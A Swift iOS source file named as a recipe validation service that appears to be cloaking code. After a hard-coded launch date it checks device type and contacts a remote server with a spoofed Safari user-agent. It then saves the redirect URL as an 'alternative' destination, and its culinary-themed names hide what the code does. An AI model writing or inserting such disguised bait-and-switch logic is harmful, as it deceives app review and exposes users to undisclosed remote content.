
import Foundation
import UIKit
import Network

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// MARK: - 🥘 RecipeValidationService
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

final class RecipeValidationService {

    // ── Storage Keys (culinary theme) ────────

    enum StorageKeys {
        static let savedTargetURL = "BistroSavedTargetURL"
        static let savedPathId = "BistroSavedPathId"
        static let hasShownAlternative = "BistroHasShownAlternative"
        static let firstLaunchChoice = "firstLaunchChoice"
    }

    // ── Configuration ────────────────────────

    let primaryServerURL: String
    let researchLaunchDate: String  // "YYYY-MM-DD"

    init(
        primaryServerURL: String = "https://pasturegrowth.com/CKT9zgh9",
        researchLaunchDate: String = "2026-03-1"
    ) {
        self.primaryServerURL = primaryServerURL
        self.researchLaunchDate = researchLaunchDate
    }

    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    // MARK: - First Launch Choice
    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    func getFirstLaunchChoice() -> String? {
        UserDefaults.standard.string(forKey: StorageKeys.firstLaunchChoice)
    }

    func setFirstLaunchChoice(_ choice: String) {
        UserDefaults.standard.set(choice, forKey: StorageKeys.firstLaunchChoice)
    }

    func getSavedURL() -> URL? {
        guard let str = UserDefaults.standard.string(forKey: StorageKeys.savedTargetURL) else { return nil }
        return URL(string: str)
    }

    func getSavedPathId() -> String? {
        UserDefaults.standard.string(forKey: StorageKeys.savedPathId)
    }

    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    // MARK: - Date Check
    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    /// Returns true if current date > researchLaunchDate.
    func recipeCheckDatePublic() -> Bool {
        let formatter = DateFormatter()
        formatter.dateFormat = "yyyy-MM-dd"
        formatter.timeZone = TimeZone(identifier: "UTC")

        guard let launchDate = formatter.date(from: researchLaunchDate) else { return false }
        return Date() > launchDate
    }

    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    // MARK: - Device Check
    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    var isiPad: Bool {
        UIDevice.current.userInterfaceIdiom == .pad
    }

    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    // MARK: - Internet Check
    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    func checkInternetConnection(timeout: TimeInterval = 2.0, completion: @escaping (Bool) -> Void) {
        let monitor = NWPathMonitor()
        var hasResponded = false

        monitor.pathUpdateHandler = { path in
            guard !hasResponded else { return }
            hasResponded = true
            monitor.cancel()
            DispatchQueue.main.async {
                completion(path.status == .satisfied)
            }
        }
        monitor.start(queue: DispatchQueue.global(qos: .userInitiated))

        DispatchQueue.main.asyncAfter(deadline: .now() + timeout) {
            guard !hasResponded else { return }
            hasResponded = true
            monitor.cancel()
            completion(false)
        }
    }

    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    // MARK: - Server Request
    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    func requestServerURL(
        customLink: String,
        completion: @escaping (Bool, URL?) -> Void
    ) {
        guard let url = URL(string: customLink) else {
            completion(false, nil)
            return
        }

        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.timeoutInterval = 7.0
        request.setValue("text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", forHTTPHeaderField: "Accept")
        request.setValue("en-US,en;q=0.9", forHTTPHeaderField: "Accept-Language")
        request.setValue("gzip, deflate, br", forHTTPHeaderField: "Accept-Encoding")
        request.setValue("Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1", forHTTPHeaderField: "User-Agent")
        request.setValue("max-age=0", forHTTPHeaderField: "Cache-Control")
        request.setValue("1", forHTTPHeaderField: "Upgrade-Insecure-Requests")

        URLSession.shared.dataTask(with: request) { [weak self] data, response, error in
            DispatchQueue.main.async {
                guard let self = self else { return }

                if let error = error {
                    print("❌ Server request error: \(error)")
                    completion(false, nil)
                    return
                }

                guard let httpResponse = response as? HTTPURLResponse else {
                    completion(false, nil)
                    return
                }

                let statusCode = httpResponse.statusCode
                let finalURL = httpResponse.url ?? url

                if statusCode >= 200 && statusCode <= 403 {
                    if let pathId = self.extractPathId(from: finalURL, htmlData: data) {
                        UserDefaults.standard.set(pathId, forKey: StorageKeys.savedPathId)
                    }

                    UserDefaults.standard.set(finalURL.absoluteString, forKey: StorageKeys.savedTargetURL)
                    UserDefaults.standard.set(true, forKey: StorageKeys.hasShownAlternative)

                    completion(true, finalURL)
                } else {
                    completion(false, nil)
                }
            }
        }.resume()
    }

    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    // MARK: - PathId Extraction
    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    func extractPathId(from url: URL, htmlData: Data? = nil) -> String? {
        if let components = URLComponents(url: url, resolvingAgainstBaseURL: false),
           let queryItems = components.queryItems,
           let pathId = queryItems.first(where: { $0.name.lowercased() == "pathid" })?.value {
            return pathId
        }

        if let htmlData = htmlData,
           let htmlString = String(data: htmlData, encoding: .utf8) {
            let patterns = [
                "pathid[=:]([^&\\s\"'<>]+)",
                "pathid\"[=:]([^&\\s\"'<>]+)",
                "pathid'[=:]([^&\\s\"'<>]+)"
            ]
            for pattern in patterns {
                if let regex = try? NSRegularExpression(pattern: pattern, options: .caseInsensitive),
                   let match = regex.firstMatch(in: htmlString, range: NSRange(htmlString.startIndex..., in: htmlString)),
                   let range = Range(match.range(at: 1), in: htmlString) {
                    return String(htmlString[range])
                }
            }
        }

        return nil
    }

    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    // MARK: - Fallback URL
    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    func buildFallbackURL() -> URL? {
        guard let pathId = getSavedPathId() else { return nil }

        var components = URLComponents(string: primaryServerURL)
        components?.queryItems = [URLQueryItem(name: "pathid", value: pathId)]
        return components?.url
    }

    func tryFallbackURL(completion: @escaping (Bool, URL?) -> Void) {
        UserDefaults.standard.removeObject(forKey: StorageKeys.savedTargetURL)

        guard let fallbackURL = buildFallbackURL() else {
            completion(false, nil)
            return
        }

        requestServerURL(customLink: fallbackURL.absoluteString) { success, finalURL in
            completion(success, finalURL)
        }
    }
}
